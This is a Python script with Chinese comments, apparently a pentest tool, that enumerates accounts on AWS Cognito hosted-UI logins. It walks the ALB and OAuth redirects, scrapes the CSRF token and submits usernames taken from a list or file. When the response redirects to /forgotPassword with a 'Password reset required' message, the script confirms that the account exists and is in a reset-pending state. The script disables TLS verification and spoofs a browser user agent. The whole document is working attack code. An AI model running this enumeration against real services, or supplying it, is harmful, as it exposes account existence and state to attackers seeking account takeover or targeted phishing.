#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Cognito hosted-UI 用户名步骤「路由 oracle」——枚举 RESET_REQUIRED 账号

用法:
  python3 cognito_hosted_ui_enum.py https://main.example.com --users staff,steve,jdoe
  python3 cognito_hosted_ui_enum.py https://corp.example.com --users-file names.txt --delay 1.5
  # 可选：--base https://<domain>.auth.<region>.amazoncognito.com   （默认从 ALB 302 自动发现）

判据（缺一不可）:
  1) POST /login 返回 302，Location 为 /forgotPassword?...        → 账号存在且处于 RESET_REQUIRED
  2) GET 该 /forgotPassword 页面 200 且正文含
     "Invalid input: Password reset required for the user"      → 存在性 + 状态被匿名确认
  3) 阴性对照: 不存在的用户名 → 302 /verifyPassword?... 且页面无该文案
"""
import argparse, html as H, json, os, re, sys, time
from urllib.parse import urljoin

import requests

UA = os.environ.get("ARTEX_UA", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                                "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")
MARK = "Password reset required for the user"


def visible(html_text: str) -> str:
    t = re.sub(r"<script.*?</script>", "", html_text, flags=re.S | re.I)
    t = re.sub(r"<style.*?</style>", "", t, flags=re.S | re.I)
    t = re.sub(r"<[^>]+>", " ", t)
    return re.sub(r"\s+", " ", H.unescape(t)).strip()


def first_form(html_text: str):
    m = re.search(r'<form[^>]*method="post"[^>]*action="([^"]+)"', html_text, re.I) \
        or re.search(r'<form[^>]*action="([^"]+)"', html_text, re.I)
    csrf = re.search(r'name="csrf"\s+value="([^"]*)"', html_text)
    if not m:
        return None, None
    return H.unescape(m.group(1)), (csrf.group(1) if csrf else None)


def new_session():
    s = requests.Session()
    s.verify = False
    s.headers.update({
        "User-Agent": UA,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    })
    return s


def discover(host: str, base: str = None, timeout: int = 30):
    """ALB -> /oauth2/authorize -> /login。返回 (base, login_url, login_html, session)。"""
    s = new_session()
    r0 = s.get(host.rstrip("/") + "/", allow_redirects=False, timeout=timeout)
    loc0 = r0.headers.get("location")
    if not loc0:
        raise RuntimeError(f"ALB 未返回 302/Location（status={r0.status_code}），确认 Host 是正确的 ALB 域名")
    if not base:
        base = "https://" + re.match(r"https?://([^/]+)", loc0).group(1)
    r1 = s.get(loc0, allow_redirects=False, timeout=timeout)
    loc1 = r1.headers.get("location")
    if not loc1:
        raise RuntimeError(f"authorize 未跳转 login（status={r1.status_code}）")
    login_url = urljoin(base + "/", loc1)
    r2 = s.get(login_url, allow_redirects=False, timeout=timeout)
    return base, login_url, r2.text, s


def probe(host: str, user: str, base: str = None, delay: float = 1.5, timeout: int = 30) -> dict:
    out = {"host": host, "username": user}
    try:
        base, login_url, html_text, s = discover(host, base, timeout)
    except Exception as e:
        out.update(verdict="ERROR", detail=f"discover: {e}")
        return out
    action, csrf = first_form(html_text)
    if not action or not csrf:
        # 新版托管 UI 可能把表单参数放在 page-data JSON 里，先 dump 出来人工看
        out.update(verdict="ERROR", detail="未找到 form/csrf，页面结构可能改版")
        return out

    time.sleep(delay)
    r3 = s.post(urljoin(base + "/", action),
                data={"csrf": csrf, "username": user, "cognitoAsfData": ""},
                headers={"Content-Type": "application/x-www-form-urlencoded",
                         "Origin": base, "Referer": login_url},
                allow_redirects=False, timeout=timeout)
    loc = r3.headers.get("location", "")
    out["username_step"] = r3.status_code
    out["location_head"] = loc.split("?")[0] if loc else ""

    if "/forgotPassword" in loc:
        r4 = s.get(urljoin(base + "/", loc), allow_redirects=False, timeout=timeout)
        body = visible(r4.text)
        out.update(forgot_status=r4.status_code,
                   matched=(MARK in body),
                   snippet=body[body.find("Invalid input"):body.find("Invalid input") + 90] if "Invalid input" in body else body[:90])
        out["verdict"] = "EXISTS_RESET_REQUIRED" if MARK in body else "FORGOT_ROUTE_UNCONFIRMED"
    elif "/verifyPassword" in loc:
        out.update(verdict="NO_ORACLE_HIT",
                   note="不存在账号或状态正常账号都走这里，本入口无法区分")
    elif "/signup" in loc:
        out.update(verdict="NO_ORACLE_HIT", note="被路由到注册页（通常表示用户不存在）")
    else:
        out.update(verdict="NO_ORACLE_HIT", visible=visible(r3.text)[:200], status=r3.status_code)
    s.close()
    return out


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("host", help="ALB / 应用域名，如 https://main.example.com")
    ap.add_argument("--users", default="", help="逗号分隔的用户名/邮箱")
    ap.add_argument("--users-file", default="", help="每行一个用户名")
    ap.add_argument("--base", default=None, help="Cognito 域（默认从 ALB 302 自动发现）")
    ap.add_argument("--delay", type=float, default=1.5, help="每次探测间隔秒")
    ap.add_argument("--timeout", type=int, default=30)
    a = ap.parse_args()

    users = [u for u in a.users.split(",") if u.strip()]
    if a.users_file:
        users += [l.strip() for l in open(a.users_file) if l.strip()]
    if not users:
        ap.error("需要 --users 或 --users-file")

    for u in users:
        print(json.dumps(probe(a.host, u, a.base, a.delay, a.timeout), ensure_ascii=False))
        time.sleep(a.delay)


if __name__ == "__main__":
    main()